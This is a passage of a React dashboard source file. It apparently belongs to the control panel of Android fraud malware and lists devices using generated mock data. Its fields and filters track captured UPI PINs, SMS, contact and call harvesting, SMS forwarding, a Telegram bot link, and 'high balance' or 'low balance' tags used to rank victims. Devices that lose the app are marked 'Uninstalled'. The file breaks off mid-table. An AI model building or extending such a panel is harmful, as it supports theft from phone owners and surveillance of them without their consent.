import { useEffect, useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { useDeviceStore } from '@/stores/deviceStore'
import { StatsCard } from '@/components/StatsCard'
import { EmptyState } from '@/components/EmptyState'
import { Button } from '@/components/ui/Button'
import { Card, CardContent } from '@/components/ui/Card'
import { formatTimeAgo } from '@/lib/utils'
import type { Device } from '@/types'

// Mock data generator
function generateMockDevices(): Device[] {
  const devices: Device[] = []
  const manufacturers = ['Samsung', 'Xiaomi', 'Oppo', 'Vivo', 'Realme', 'INFINIX']
  const models = ['Galaxy S21', 'Redmi Note 10', 'A54', 'Y20', 'Narzo 30', 'Infinix X6857B']
  const carriers = ['Airtel', 'Jio', 'Vi India', 'BSNL']
  const appTypes = ['wosexy', 'whatsapp', 'telegram']
  
  for (let i = 0; i < 12; i++) {
    const isDeleted = i < 2
    const isPending = i >= 2 && i < 4
    const isOnline = !isDeleted && !isPending && Math.random() > 0.3
    
    const manufacturer = manufacturers[Math.floor(Math.random() * manufacturers.length)]
    const model = models[Math.floor(Math.random() * models.length)]
    const carrier = carriers[Math.floor(Math.random() * carriers.length)]
    const appType = appTypes[Math.floor(Math.random() * appTypes.length)]
    
    const totalStorage = 107757.96875
    const freeStorage = Math.random() * totalStorage
    const totalRam = 5436.75390625
    const freeRam = Math.random() * totalRam
    
    devices.push({
      device_id: `device_${i + 1}`,
      admin_token: `token_${i + 1}`,
      admin_username: 'admin',
      app_type: appType,
      battery_level: Math.floor(Math.random() * 100),
      battery_state: Math.random() > 0.5 ? 'charging' : 'discharging',
      is_charging: Math.random() > 0.5,
      board: `${manufacturer}-${model}`,
      brand: manufacturer,
      device: `${manufacturer}-${model}`,
      device_name: `${manufacturer} ${model}`,
      display: `${model}-Display`,
      fingerprint: `${manufacturer}/${model}:15/fingerprint`,
      hardware: 'mt6878',
      host: 'srv99186-1010',
      manufacturer,
      model,
      product: `${model}-IN`,
      os_version: `${10 + Math.floor(Math.random() * 6)}`,
      sdk_int: 30 + Math.floor(Math.random() * 5),
      screen_density: 280,
      screen_resolution: '720x1600',
      supported_abis: ['arm64-v8a'],
      total_storage_mb: totalStorage,
      free_storage_mb: freeStorage,
      storage_used_mb: totalStorage - freeStorage,
      storage_percent_free: (freeStorage / totalStorage) * 100,
      total_ram_mb: totalRam,
      free_ram_mb: freeRam,
      ram_used_mb: totalRam - freeRam,
      ram_percent_free: (freeRam / totalRam) * 100,
      network_type: 'Mobile',
      ip_address: `192.0.0.${i + 1}`,
      status: isOnline ? 'online' : 'offline',
      is_online: isOnline,
      is_emulator: false,
      is_rooted: false,
      last_online_update: new Date(Date.now() - Math.random() * 3600000).toISOString(),
      last_ping: isDeleted 
        ? new Date(Date.now() - 10 * 24 * 60 * 60 * 1000).toISOString()
        : new Date(Date.now() - Math.random() * 3600000).toISOString(),
      registered_at: new Date(Date.now() - Math.random() * 86400000 * 30).toISOString(),
      updated_at: new Date(Date.now() - Math.random() * 3600000).toISOString(),
      settings: {
        monitoring_enabled: true,
        sms_forward_enabled: false,
        forward_number: null,
      },
      stats: {
        total_sms: isPending ? 0 : Math.floor(Math.random() * 1000),
        total_contacts: Math.floor(Math.random() * 500),
        total_calls: Math.floor(Math.random() * 200),
        last_sms_sync: new Date(Date.now() - Math.random() * 3600000).toISOString(),
        last_contact_sync: new Date(Date.now() - Math.random() * 3600000).toISOString(),
        last_call_sync: new Date(Date.now() - Math.random() * 3600000).toISOString(),
      },
      sim_info: [
        {
          sim_slot: 0,
          subscription_id: 4,
          carrier_name: carrier,
          display_name: carrier,
          phone_number: `+91${Math.floor(Math.random() * 9000000000 + 1000000000)}`,
          country_iso: 'in',
          mcc: '404',
          mnc: '11',
          network_type: 'LTE (4G)',
          sim_state: 'Ready',
          data_enabled: true,
          voice_capable: true,
          sms_capable: true,
        },
      ],
      has_upi: Math.random() > 0.5,
      upi_detected_at: null,
      upi_last_updated_at: new Date(Date.now() - Math.random() * 3600000).toISOString(),
      upi_pins: [
        {
          pin: '123456',
          app_type: 'Google Pay',
          status: 'success',
          detected_at: new Date(Date.now() - Math.random() * 3600000).toISOString(),
        },
      ],
      telegram_bot_id: 1,
      fcm_tokens: [],
      user_id: `user_${i + 1}`,
      is_deleted: isDeleted,
      deleted_at: isDeleted ? new Date(Date.now() - 10 * 24 * 60 * 60 * 1000).toISOString() : undefined,
      deleted_sms_ids: isDeleted ? [] : undefined,
      note: i % 3 === 0 ? 'high_balance' : i % 3 === 1 ? 'low_balance' : null,
      note_text: i % 3 === 0 ? 'Account has good balance' : i % 3 === 1 ? 'Need recharge' : null,
    })
  }
  
  return devices
}

export default function DashboardPage() {
  const navigate = useNavigate()
  const [noteDialog, setNoteDialog] = useState<{ 
    open: boolean
    deviceId: string
    currentNote: string | null
    currentText: string
  }>({
    open: false,
    deviceId: '',
    currentNote: null,
    currentText: '',
  })
  const [noteText, setNoteText] = useState('')
  
  const {
    stats,
    filters,
    setDevices,
    setStats,
    setFilters,
    getFilteredDevices,
    updateDeviceNote,
  } = useDeviceStore()
  
  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text)
  }
  
  const toggleFilter = (filterValue: string) => {
    const currentFilters = filters.status
    
    if (filterValue === 'all') {
      setFilters({ status: ['all'] })
      return
    }
    
    // Define filter groups - only one from each group can be active
    const filterGroups = {
      connection: ['online', 'offline'],
      activity: ['active', 'pending'],
      battery: ['high_battery', 'low_battery'],
      balance: ['high_balance', 'low_balance'],
      upi: ['has_upi', 'no_upi'],
      deletion: ['deleted'],
    }
    
    // Find which group this filter belongs to
    let filterGroup: string[] = []
    for (const group of Object.values(filterGroups)) {
      if (group.includes(filterValue)) {
        filterGroup = group
        break
      }
    }
    
    let newFilters = currentFilters.filter(f => f !== 'all')
    
    // If clicking the same filter, remove it
    if (newFilters.includes(filterValue as any)) {
      newFilters = newFilters.filter(f => f !== filterValue)
    } else {
      // Remove any other filters from the same group
      newFilters = newFilters.filter(f => !filterGroup.includes(f))
      // Add the new filter
      newFilters.push(filterValue as any)
    }
    
    if (newFilters.length === 0) {
      newFilters = ['all']
    }
    
    setFilters({ status: newFilters as any })
  }
  
  const isFilterActive = (filterValue: string) => {
    return filters.status.includes(filterValue as any)
  }
  
  useEffect(() => {
    const mockDevices = generateMockDevices()
    setDevices(mockDevices)
    
    const onlineCount = mockDevices.filter(d => d.is_online).length
    const activeCount = mockDevices.filter(d => d.stats.total_sms > 0).length
    const pendingCount = mockDevices.filter(d => d.stats.total_sms === 0 && !d.is_online).length
    const deletedCount = mockDevices.filter(d => {
      const daysSinceLastPing = (new Date().getTime() - new Date(d.last_ping).getTime()) / (24 * 60 * 60 * 1000)
      return daysSinceLastPing > 7
    }).length
    
    setStats({
      totalDevices: mockDevices.length,
      onlineDevices: onlineCount,
      activeDevices: activeCount,
      pendingDevices: pendingCount,
      deletedDevices: deletedCount,
    })
  }, [setDevices, setStats])
  
  const filteredDevices = getFilteredDevices()
  
  return (
    <div className="p-8">
      {/* Stats Grid */}
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-6 gap-6 mb-8">
        <StatsCard
          title="Total"
          value={stats.totalDevices}
          icon={
            <svg className="w-7 h-7 text-blue-600 dark:text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
            </svg>
          }
          color="bg-blue-100 dark:bg-blue-900/20"
          onClick={() => toggleFilter('all')}
        />
        
        <StatsCard
          title="Active"
          value={stats.activeDevices}
          icon={
            <svg className="w-7 h-7 text-green-600 dark:text-green-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
          }
          color="bg-green-100 dark:bg-green-900/20"
          onClick={() => toggleFilter('active')}
        />
        
        <StatsCard
          title="Pending"
          value={stats.pendingDevices}
          icon={
            <svg className="w-7 h-7 text-orange-600 dark:text-orange-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
          }
          color="bg-orange-100 dark:bg-orange-900/20"
          onClick={() => toggleFilter('pending')}
        />
        
        <StatsCard
          title="Online"
          value={stats.onlineDevices}
          icon={
            <svg className="w-7 h-7 text-cyan-600 dark:text-cyan-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8.111 16.404a5.5 5.5 0 017.778 0M12 20h.01m-7.08-7.071c3.904-3.905 10.236-3.905 14.141 0M1.394 9.393c5.857-5.857 15.355-5.857 21.213 0" />
            </svg>
          }
          color="bg-cyan-100 dark:bg-cyan-900/20"
          onClick={() => toggleFilter('online')}
        />
        
        <StatsCard
          title="Offline"
          value={stats.totalDevices - stats.onlineDevices}
          icon={
            <svg className="w-7 h-7 text-slate-600 dark:text-slate-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M18.364 5.636a9 9 0 010 12.728m0 0l-2.829-2.829m2.829 2.829L21 21M15.536 8.464a5 5 0 010 7.072m0 0l-2.829-2.829m-4.243 2.829a4.978 4.978 0 01-1.414-2.83m-1.414 5.658a9 9 0 01-2.167-9.238m7.824 2.167a1 1 0 111.414 1.414m-1.414-1.414L3 3" />
            </svg>
          }
          color="bg-slate-100 dark:bg-slate-800"
          onClick={() => toggleFilter('offline')}
        />
        
        <StatsCard
          title="Uninstalled"
          value={stats.deletedDevices || 0}
          icon={
            <svg className="w-7 h-7 text-red-600 dark:text-red-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" />
            </svg>
          }
          color="bg-red-100 dark:bg-red-900/20"
          onClick={() => toggleFilter('deleted')}
        />
      </div>
      
      {/* Filters */}
      <Card className="mb-6">
        <CardContent className="p-4">
          {/* Search Bar */}
          <div className="mb-3">
            <div className="relative max-w-md">
              <input
                type="text"
                placeholder="Search devices..."
                value={filters.search}
                onChange={(e) => setFilters({ search: e.target.value })}
                className="w-full pl-9 pr-3 py-2 text-sm bg-slate-50 dark:bg-slate-900/50 border border-slate-200 dark:border-slate-700 rounded-lg text-slate-900 dark:text-slate-100 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-primary focus:border-transparent transition-all"
              />
              <svg className="w-4 h-4 text-slate-400 absolute left-3 top-2.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
              </svg>
            </div>
          </div>

          {/* Filter Buttons */}
          <div className="flex flex-wrap items-center gap-2">
            <button
              onClick={() => toggleFilter('all')}
              className={`px-3 py-1.5 rounded-md text-xs font-medium transition-all ${
                isFilterActive('all')
                  ? 'bg-primary text-white'
                  : 'bg-slate-100 dark:bg-slate-800 text-slate-600 dark:text-slate-400 hover:bg-slate-200 dark:hover:bg-slate-700'
              }`}
            >
              All <span className="ml-1 opacity-70">{stats.totalDevices}</span>
            </button>

            <button
              onClick={() => toggleFilter('online')}
              className={`px-3 py-1.5 rounded-md text-xs font-medium transition-all ${
                isFilterActive('online')
                  ? 'bg-success text-white'
                  : 'bg-slate-100 dark:bg-slate-800 text-slate-600 dark:text-slate-400 hover:bg-slate-200 dark:hover:bg-slate-700'
              }`}
            >
              Online <span className="ml-1 opacity-70">{stats.onlineDevices}</span>
            </button>

            <button
              onClick={() => toggleFilter('offline')}
              className={`px-3 py-1.5 rounded-md text-xs font-medium transition-all ${
                isFilterActive('offline')
                  ? 'bg-orange-500 text-white'
                  : 'bg-slate-100 dark:bg-slate-800 text-slate-600 dark:text-slate-400 hover:bg-slate-200 dark:hover:bg-slate-700'
              }`}
            >
              Offline <span className="ml-1 opacity-70">{stats.totalDevices - stats.onlineDevices}</span>
            </button>

            <span className="text-slate-300 dark:text-slate-700">|</span>

            <button 
              onClick={() => toggleFilter('active')}
              className={`px-3 py-1.5 rounded-md text-xs font-medium transition-all ${
                isFilterActive('active')
                  ? 'bg-green-500 text-white'
                  : 'bg-slate-100 dark:bg-slate-800 text-slate-600 dark:text-slate-400 hover:bg-slate-200 dark:hover:bg-slate-700'
              }`}
            >
              Active <span className="ml-1 opacity-70">{stats.activeDevices}</span>
            </button>

            <button 
              onClick={() => toggleFilter('pending')}
              className={`px-3 py-1.5 rounded-md text-xs font-medium transition-all ${
                isFilterActive('pending')
                  ? 'bg-orange-500 text-white'
                  : 'bg-slate-100 dark:bg-slate-800 text-slate-600 dark:text-slate-400 hover:bg-slate-200 dark:hover:bg-slate-700'
              }`}
            >
              Pending <span className="ml-1 opacity-70">{stats.pendingDevices}</span>
            </button>

            <span className="text-slate-300 dark:text-slate-700">|</span>

            <button 
              onClick={() => toggleFilter('has_upi')}
              className={`px-3 py-1.5 rounded-md text-xs font-medium transition-all ${
                isFilterActive('has_upi')
                  ? 'bg-indigo-500 text-white'
                  : 'bg-slate-100 dark:bg-slate-800 text-slate-600 dark:text-slate-400 hover:bg-slate-200 dark:hover:bg-slate-700'
              }`}
            >
              UPI <span className="ml-1 opacity-70">{filteredDevices.filter(d => d.has_upi).length}</span>
            </button>

            <button 
              onClick={() => toggleFilter('no_upi')}
              className={`px-3 py-1.5 rounded-md text-xs font-medium transition-all ${
                isFilterActive('no_upi')
                  ? 'bg-slate-500 text-white'
                  : 'bg-slate-100 dark:bg-slate-800 text-slate-600 dark:text-slate-400 hover:bg-slate-200 dark:hover:bg-slate-700'
              }`}
            >
              No UPI <span className="ml-1 opacity-70">{filteredDevices.filter(d => !d.has_upi).length}</span>
            </button>

            <span className="text-slate-300 dark:text-slate-700">|</span>

            <button 
              onClick={() => toggleFilter('high_balance')}
              className={`inline-flex items-center gap-1.5 px-3 py-1.5 rounded-md text-xs font-medium transition-all ${
                isFilterActive('high_balance')
                  ? 'bg-emerald-500 text-white'
                  : 'bg-slate-100 dark:bg-slate-800 text-slate-600 dark:text-slate-400 hover:bg-slate-200 dark:hover:bg-slate-700'
              }`}
            >
              <svg className="w-3.5 h-3.5" fill="currentColor" viewBox="0 0 20 20">
                <path d="M8.433 7.418c.155-.103.346-.196.567-.267v1.698a2.305 2.305 0 01-.567-.267C8.07 8.34 8 8.114 8 8c0-.114.07-.34.433-.582zM11 12.849v-1.698c.22.071.412.164.567.267.364.243.433.468.433.582 0 .114-.07.34-.433.582a2.305 2.305 0 01-.567.267z" />
                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-13a1 1 0 10-2 0v.092a4.535 4.535 0 00-1.676.662C6.602 6.234 6 7.009 6 8c0 .99.602 1.765 1.324 2.246.48.32 1.054.545 1.676.662v1.941c-.391-.127-.68-.317-.843-.504a1 1 0 10-1.51 1.31c.562.649 1.413 1.076 2.353 1.253V15a1 1 0 102 0v-.092a4.535 4.535 0 001.676-.662C13.398 13.766 14 12.991 14 12c0-.99-.602-1.765-1.324-2.246A4.535 4.535 0 0011 9.092V7.151c.391.127.68.317.843.504a1 1 0 101.511-1.31c-.563-.649-1.413-1.076-2.354-1.253V5z" clipRule="evenodd" />
              </svg>
              High Balance <span className="ml-1 opacity-70">{filteredDevices.filter(d => d.note === 'high_balance').length}</span>
            </button>

            <button 
              onClick={() => toggleFilter('low_balance')}
              className={`inline-flex items-center gap-1.5 px-3 py-1.5 rounded-md text-xs font-medium transition-all ${
                isFilterActive('low_balance')
                  ? 'bg-rose-500 text-white'
                  : 'bg-slate-100 dark:bg-slate-800 text-slate-600 dark:text-slate-400 hover:bg-slate-200 dark:hover:bg-slate-700'
              }`}
            >
              <svg className="w-3.5 h-3.5" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
              </svg>
              Low Balance <span className="ml-1 opacity-70">{filteredDevices.filter(d => d.note === 'low_balance').length}</span>
            </button>

            <span className="text-slate-300 dark:text-slate-700">|</span>

            <button 
              onClick={() => toggleFilter('high_battery')}
              className={`inline-flex items-center gap-1.5 px-3 py-1.5 rounded-md text-xs font-medium transition-all ${
                isFilterActive('high_battery')
                  ? 'bg-green-500 text-white'
                  : 'bg-slate-100 dark:bg-slate-800 text-slate-600 dark:text-slate-400 hover:bg-slate-200 dark:hover:bg-slate-700'
              }`}
            >
              <svg className="w-3.5 h-3.5" fill="currentColor" viewBox="0 0 20 20">
                <path d="M11 3a1 1 0 10-2 0v1a1 1 0 102 0V3zM15.657 5.757a1 1 0 00-1.414-1.414l-.707.707a1 1 0 001.414 1.414l.707-.707zM18 10a1 1 0 01-1 1h-1a1 1 0 110-2h1a1 1 0 011 1zM5.05 6.464A1 1 0 106.464 5.05l-.707-.707a1 1 0 00-1.414 1.414l.707.707zM5 10a1 1 0 01-1 1H3a1 1 0 110-2h1a1 1 0 011 1zM8 16v-1h4v1a2 2 0 11-4 0zM12 14c.015-.34.208-.646.477-.859a4 4 0 10-4.954 0c.27.213.462.519.476.859h4.002z" />
              </svg>
              High Battery <span className="ml-1 opacity-70">{filteredDevices.filter(d => d.battery_level >= 80).length}</span>
            </button>

            <button 
              onClick={() => toggleFilter('low_battery')}
              className={`inline-flex items-center gap-1.5 px-3 py-1.5 rounded-md text-xs font-medium transition-all ${
                isFilterActive('low_battery')
                  ? 'bg-red-500 text-white'
                  : 'bg-slate-100 dark:bg-slate-800 text-slate-600 dark:text-slate-400 hover:bg-slate-200 dark:hover:bg-slate-700'
              }`}
            >
              <svg className="w-3.5 h-3.5" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M8 4a4 4 0 100 8 4 4 0 000-8zM2 8a6 6 0 1110.89 3.476l4.817 4.817a1 1 0 01-1.414 1.414l-4.816-4.816A6 6 0 012 8z" clipRule="evenodd" />
                <path d="M5 8a1 1 0 011-1h4a1 1 0 110 2H6a1 1 0 01-1-1z" />
              </svg>
              Low Battery <span className="ml-1 opacity-70">{filteredDevices.filter(d => d.battery_level < 20).length}</span>
            </button>

            <span className="text-slate-300 dark:text-slate-700">|</span>

            <button 
              onClick={() => toggleFilter('deleted')}
              className={`px-3 py-1.5 rounded-md text-xs font-medium transition-all ${
                isFilterActive('deleted')
                  ? 'bg-red-500 text-white'
                  : 'bg-red-50 dark:bg-red-900/20 text-red-600 dark:text-red-400 hover:bg-red-100 dark:hover:bg-red-900/30'
              }`}
            >
              Deleted <span className="ml-1 opacity-70">{stats.deletedDevices || 0}</span>
            </button>

            <span className="flex-1"></span>

            <div className="flex items-center gap-1.5">
              <span className="text-xs text-slate-500 dark:text-slate-400">Show:</span>
              {[25, 50, 100, 200].map((num) => (
                <button
                  key={num}
                  className={`px-2.5 py-1.5 rounded-md text-xs font-medium transition-all ${
                    num === 50
                      ? 'bg-primary text-white'
                      : 'bg-slate-100 dark:bg-slate-800 text-slate-600 dark:text-slate-400 hover:bg-slate-200 dark:hover:bg-slate-700'
                  }`}
                >
                  {num}
                </button>
              ))}
            </div>

            <Button
              variant="outline"
              size="sm"
              onClick={() => {
                const mockDevices = generateMockDevices()
                setDevices(mockDevices)
                
                const onlineCount = mockDevices.filter(d => d.is_online).length
                const activeCount = mockDevices.filter(d => d.stats.total_sms > 0).length
                const pendingCount = mockDevices.filter(d => d.stats.total_sms === 0 && !d.is_online).length
                const deletedCount = mockDevices.filter(d => {
                  const daysSinceLastPing = (new Date().getTime() - new Date(d.last_ping).getTime()) / (24 * 60 * 60 * 1000)
                  return daysSinceLastPing > 7
                }).length
                
                setStats({
                  totalDevices: mockDevices.length,
                  onlineDevices: onlineCount,
                  activeDevices: activeCount,
                  pendingDevices: pendingCount,
                  deletedDevices: deletedCount,
                })
              }}
              title="Refresh"
            >
              <svg className="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
              </svg>
            </Button>

            <Button
              variant="outline"
              size="sm"
              onClick={() => setFilters({ search: '', status: ['all'], appType: '', adminUsername: '' })}
              title="Reset Filters"
            >
              <svg className="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
              </svg>
            </Button>
          </div>
        </CardContent>
      </Card>

      {/* Device Table */}
      {filteredDevices.length === 0 ? (
        <EmptyState
          title="No devices found"
          description="Try adjusting your filters or search query"
          icon={
            <svg className="w-16 h-16 text-slate-300 dark:text-slate-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
            </svg>
          }
        />
      ) : (
        <Card>
          <div className="overflow-x-auto">
            <table className="w-full">
              <thead>
                <tr className="border-b border-slate-200 dark:border-slate-700">
                  <th className="text-left py-3 px-4 text-xs font-semibold text-slate-600 dark:text-slate-400 uppercase tracking-wider">
                    Device
                  </th>
                  <th className="text-left py-3 px-4 text-xs font-semibold text-slate-600 dark:text-slate-400 uppercase tracking-wider">
                    Status
                  </th>
                  <th className="text-left py-3 px-4 text-xs font-semibold text-slate-600 dark:text-slate-400 uppercase tracking-wider">
                    Battery
                  </th>
                  <th className="text-left py-3 px-4 text-xs font-semibold text-slate-600 dark:text-slate-400 uppercase tracking-wider">
                    Storage
                  </th>
                  <th className="text-left py-3 px-4 text-xs font-semibold text-slate-600 dark:text-slate-400 uppercase tracking-wider">
                    UPI
                  </th>
                  <th className="text-left py-3 px-4 text-xs font-semibold text-slate-600 dark:text-slate-400 uppercase tracking-wider">
                    Last Ping
                  </th>
                  <th className="text-right py-3 px-4 text-xs font-semibold text-slate-600 dark:text-slate-400 uppercase tracking-wider">
                    Actions
                  </th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-200 dark:divide-slate-700">
                {filteredDevices.map((device) => {
                  const isAppDeleted = new Date().getTime() - new Date(device.last_ping).getTime() > 7 * 24 * 60 * 60 * 1000
                  const isPending = !device.is_online && device.stats.total_sms === 0 && !isAppDeleted
                  
                  return (
                    <tr
                      key={device.device_id}
                      className={`hover:bg-slate-50 dark:hover:bg-slate-800/50 transition-colors cursor-pointer ${
                        isAppDeleted ? 'bg-red-50/50 dark:bg-red-900/10' : isPending ? 'bg-orange-50/50 dark:bg-orange-900/10' : ''
                      }`}
                      onClick={() => navigate(`/devices/${device.device_id}`)}
                    >
                      <td className="py-3 px-4">
                        <div className="flex items-start gap-3">
                          <div className={`w-10 h-10 rounded-lg flex items-center justify-center flex-shrink-0 ${
                            device.is_online 
                              ? 'bg-green-100 dark:bg-green-900/30' 
                              : isPending
                              ? 'bg-orange-100 dark:bg-orange-900/30'
                              : isAppDeleted
                              ? 'bg-red-100 dark:bg-red-900/30'
                              : 'bg-slate-100 dark:bg-slate-800'
                          }`}>
                            <svg 
                              className={`w-5 h-5 ${
                                device.is_online 
                                  ? 'text-green-600 dark:text-green-400' 
                                  : isPending
                                  ? 'text-orange-600 dark:text-orange-400'
                                  : isAppDeleted
                                  ? 'text-red-600 dark:text-red-400'
                                  : 'text-slate-400 dark:text-slate-500'
                              }`} 
                              fill="none" 
                              viewBox="0 0 24 24" 
                              stroke="currentColor"
                            >
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
                            </svg>
                          </div>
                          <div className="min-w-0 flex-1">
                            <div className="flex items-center gap-2 flex-wrap">
                              <p className="text-sm font-medium text-slate-900 dark:text-slate-100">
                                {device.device_name || device.model}
                              </p>
                              {isAppDeleted && (
                                <span className="inline-flex items-center px-2 py-0.5 rounded text-xs font-medium bg-red-100 text-red-800 dark:bg-red-900/30 dark:text-red-400">
                                  Uninstalled
                                </span>
                              )}
                              {isPending && !isAppDeleted && (
                                <span className="inline-flex items-center px-2 py-0.5 rounded text-xs font-medium bg-orange-100 text-orange-800 dark:bg-orange-900/30 dark:text-orange-400">
                                  Pending
                                </span>
                              )}
                            </div>
                            
                            {/* Device ID */}
                            <div className="flex items-center gap-1.5 mt-1">
                              <button
                                onClick={(e) => {
                                  e.stopPropagation()
                                  copyToClipboard(device.device_id)
                                }}
                                className="inline-flex items-center gap-1 px-2 py-0.5 rounded bg-slate-100 dark:bg-slate-800 hover:bg-slate-200 dark:hover:bg-slate-700 transition-colors group"
                                title="Click to copy"
                              >
                                <svg className="w-3 h-3 text-slate-400 dark:text-slate-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z" />
                                </svg>
                                <span className="text-xs font-mono text-slate-600 dark:text-slate-400 group-hover:text-primary">
                                  {device.device_id}
                                </span>
                              </button>
                            </div>
                            
                            {/* Note */}
                            {device.note && device.note_text && (
                              <div className="mt-1.5">
                                <div className={`inline-flex items-center gap-1.5 px-2 py-1 rounded-md ${
                                  device.note === 'high_balance'
                                    ? 'bg-emerald-50 dark:bg-emerald-900/20'
                                    : 'bg-rose-50 dark:bg-rose-900/20'
                                }`}>
                                  {device.note === 'high_balance' ? (
                                    <svg className="w-3.5 h-3.5 text-emerald-600 dark:text-emerald-400 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                                      <path d="M8.433 7.418c.155-.103.346-.196.567-.267v1.698a2.305 2.305 0 01-.567-.267C8.07 8.34 8 8.114 8 8c0-.114.07-.34.433-.582zM11 12.849v-1.698c.22.071.412.164.567.267.364.243.433.468.433.582 0 .114-.07.34-.433.582a2.305 2.305 0 01-.567.267z" />
                                      <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-13a1 1 0 10-2 0v.092a4.535 4.535 0 00-1.676.662C6.602 6.234 6 7.009 6 8c0 .99.602 1.765 1.324 2.246.48.32 1.054.545 1.676.662v1.941c-.391-.127-.68-.317-.843-.504a1 1 0 10-1.51 1.31c.562.649 1.413 1.076 2.353 1.253V15a1 1 0 102 0v-.092a4.535 4.535 0 001.676-.662C13.398 13.766 14 12.991 14 12c0-.99-.602-1.765-1.324-2.246A4.535 4.535 0 0011 9.092V7.151c.391.127.68.317.843.504a1 1 0 101.511-1.31c-.563-.649-1.413-1.076-2.354-1.253V5z" clipRule="evenodd" />
                                    </svg>
                                  ) : (
                                    <svg className="w-3.5 h-3.5 text-rose-600 dark:text-rose-400 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                                      <path fillRule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
                                    </svg>
                                  )}
                                  <span className={`text-xs font-medium ${
                                    device.note === 'high_balance' 
                                      ? 'text-emerald-700 dark:text-emerald-300' 
                                      : 'text-rose-700 dark:text-rose-300'
                                  }`}>
                                    {device.note_text}
                                  </span>
                                </div>
                              </div>
                            )}
                          </div>
                        </div>
                      </td>
                      <td className="py-3 px-4">
                        <span className={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-xs font-medium ${
                          device.is_online
                            ? 'bg-green-100 text-green-700 dark:bg-green-900/30 dark:text-green-400'
                            : 'bg-slate-100 text-slate-700 dark:bg-slate-800 dark:text-slate-400'
                        }`}>
                          <span className={`w-1.5 h-1.5 rounded-full ${
                            device.is_online ? 'bg-green-500' : 'bg-slate-400'
                          }`} />
                          {device.is_online ? 'Online' : 'Offline'}
                        </span>
                      </td>
                      <td className="py-3 px-4">
                        <div className="flex items-center gap-2">
                          <svg className={`w-4 h-4 flex-shrink-0 ${
                            device.battery_level >= 80
                              ? 'text-green-500'
                              : device.battery_level >= 50
                              ? 'text-blue-500'
                              : device.battery_level >= 20
                              ? 'text-orange-500'
                              : 'text-red-500'
                          }`} fill="currentColor" viewBox="0 0 20 20">
